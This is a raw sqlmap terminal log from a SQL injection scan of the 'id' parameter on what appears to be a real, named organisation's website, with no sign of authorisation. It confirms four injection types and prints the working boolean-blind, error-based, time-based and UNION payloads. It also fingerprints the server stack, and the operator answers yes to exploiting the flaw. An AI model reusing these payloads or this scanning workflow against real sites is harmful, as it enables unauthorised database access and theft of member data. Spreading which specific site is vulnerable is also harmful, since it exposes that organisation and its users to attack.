        ___
       __H__
 ___ ___[(]_____ ___ ___  {1.5.7#stable}
|_ -| . [(]     | .'| . |
|___|_  [)]_|_|_|__,|  _|
      |_|V...       |_|   http://sqlmap.org

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting @ 06:54:30 /2021-11-29/

[?1049h[22;0;0t[1;44r(B[m[4l[?7h[44;1H[?1049l[23;0;0t[?1l>[06:54:30] [INFO] using 'STDIN' for parsing targets list
URL 1:
GET http://www.asfaa.org/members.php?id=1
do you want to test this URL? [Y/n/q]
> Y
[06:54:31] [INFO] testing URL 'http://www.asfaa.org/members.php?id=1'
[06:54:31] [INFO] using '/home/salazar/.local/share/sqlmap/output/results-11292021_0654am.csv' as the CSV results file in multiple targets mode
[06:54:31] [INFO] testing connection to the target URL
[06:54:32] [INFO] checking if the target is protected by some kind of WAF/IPS
[06:54:32] [INFO] testing if the target URL content is stable
[06:54:33] [INFO] target URL content is stable
[06:54:33] [INFO] testing if GET parameter 'id' is dynamic
[06:54:33] [INFO] GET parameter 'id' appears to be dynamic
[06:54:34] [INFO] heuristic (basic) test shows that GET parameter 'id' might be injectable (possible DBMS: 'MySQL')
[06:54:35] [INFO] testing for SQL injection on GET parameter 'id'
it looks like the back-end DBMS is 'MySQL'. Do you want to skip test payloads specific for other DBMSes? [Y/n] Y
for the remaining tests, do you want to include all tests for 'MySQL' extending provided level (1) and risk (1) values? [Y/n] Y
[06:54:35] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'
[06:54:36] [INFO] GET parameter 'id' appears to be 'AND boolean-based blind - WHERE or HAVING clause' injectable (with --string="All")
[06:54:36] [INFO] testing 'Generic inline queries'
[06:54:37] [INFO] testing 'MySQL >= 5.5 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (BIGINT UNSIGNED)'
[06:54:37] [INFO] testing 'MySQL >= 5.5 OR error-based - WHERE or HAVING clause (BIGINT UNSIGNED)'
[06:54:37] [INFO] testing 'MySQL >= 5.5 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (EXP)'
[06:54:38] [INFO] testing 'MySQL >= 5.5 OR error-based - WHERE or HAVING clause (EXP)'
[06:54:38] [INFO] testing 'MySQL >= 5.6 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (GTID_SUBSET)'
[06:54:38] [INFO] testing 'MySQL >= 5.6 OR error-based - WHERE or HAVING clause (GTID_SUBSET)'
[06:54:39] [INFO] testing 'MySQL >= 5.7.8 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (JSON_KEYS)'
[06:54:39] [INFO] testing 'MySQL >= 5.7.8 OR error-based - WHERE or HAVING clause (JSON_KEYS)'
[06:54:40] [INFO] testing 'MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)'
[06:54:40] [INFO] testing 'MySQL >= 5.0 OR error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)'
[06:54:40] [INFO] testing 'MySQL >= 5.1 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (EXTRACTVALUE)'
[06:54:41] [INFO] testing 'MySQL >= 5.1 OR error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (EXTRACTVALUE)'
[06:54:41] [INFO] testing 'MySQL >= 5.1 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (UPDATEXML)'
[06:54:41] [INFO] testing 'MySQL >= 5.1 OR error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (UPDATEXML)'
[06:54:42] [INFO] testing 'MySQL >= 4.1 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)'
[06:54:42] [INFO] testing 'MySQL >= 4.1 OR error-based - WHERE or HAVING clause (FLOOR)'
[06:54:42] [INFO] testing 'MySQL OR error-based - WHERE or HAVING clause (FLOOR)'
[06:54:43] [INFO] GET parameter 'id' is 'MySQL OR error-based - WHERE or HAVING clause (FLOOR)' injectable 
[06:54:43] [INFO] testing 'MySQL inline queries'
[06:54:43] [INFO] testing 'MySQL >= 5.0.12 stacked queries (comment)'
[06:54:43] [WARNING] time-based comparison requires larger statistical model, please wait.. (done)
[06:54:44] [INFO] testing 'MySQL >= 5.0.12 stacked queries'
[06:54:45] [INFO] testing 'MySQL >= 5.0.12 stacked queries (query SLEEP - comment)'
[06:54:45] [INFO] testing 'MySQL >= 5.0.12 stacked queries (query SLEEP)'
[06:54:45] [INFO] testing 'MySQL < 5.0.12 stacked queries (heavy query - comment)'
[06:54:46] [INFO] testing 'MySQL < 5.0.12 stacked queries (heavy query)'
[06:54:46] [INFO] testing 'MySQL >= 5.0.12 AND time-based blind (query SLEEP)'
[06:54:57] [INFO] GET parameter 'id' appears to be 'MySQL >= 5.0.12 AND time-based blind (query SLEEP)' injectable 
[06:54:57] [INFO] testing 'Generic UNION query (NULL) - 1 to 20 columns'
[06:54:57] [INFO] automatically extending ranges for UNION query injection technique tests as there is at least one other (potential) technique found
[06:54:58] [INFO] 'ORDER BY' technique appears to be usable. This should reduce the time needed to find the right number of query columns. Automatically extending the range for current UNION query injection technique test
[06:54:59] [INFO] target URL appears to have 4 columns in query
[06:55:03] [INFO] GET parameter 'id' is 'Generic UNION query (NULL) - 1 to 20 columns' injectable
GET parameter 'id' is vulnerable. Do you want to keep testing the others (if any)? [y/N] N
sqlmap identified the following injection point(s) with a total of 53 HTTP(s) requests:
---
Parameter: id (GET)
    Type: boolean-based blind
    Title: AND boolean-based blind - WHERE or HAVING clause
    Payload: id=1 AND 2547=2547

    Type: error-based
    Title: MySQL OR error-based - WHERE or HAVING clause (FLOOR)
    Payload: id=-8218 OR 1 GROUP BY CONCAT(0x71786a7171,(SELECT (CASE WHEN (3282=3282) THEN 1 ELSE 0 END)),0x716a7a7171,FLOOR(RAND(0)*2)) HAVING MIN(0)#

    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: id=1 AND (SELECT 8732 FROM (SELECT(SLEEP(5)))wtba)

    Type: UNION query
    Title: Generic UNION query (NULL) - 4 columns
    Payload: id=-9895 UNION ALL SELECT NULL,CONCAT(0x71786a7171,0x63686851625066504d50766579677453474e4e6c4b7a615877437157685374696d45785458626b76,0x716a7a7171),NULL,NULL-- -
---
do you want to exploit this SQL injection? [Y/n] Y
[06:55:03] [INFO] the back-end DBMS is MySQL
web application technology: PHP 7.3.11, Apache 2.4.51
back-end DBMS: MySQL >= 5.0.12 (Percona fork)
[06:55:04] [INFO] you can find results of scanning in multiple targets mode inside the CSV file '/home/salazar/.local/share/sqlmap/output/results-11292021_0654am.csv'

[*] ending @ 06:55:04 /2021-11-29/

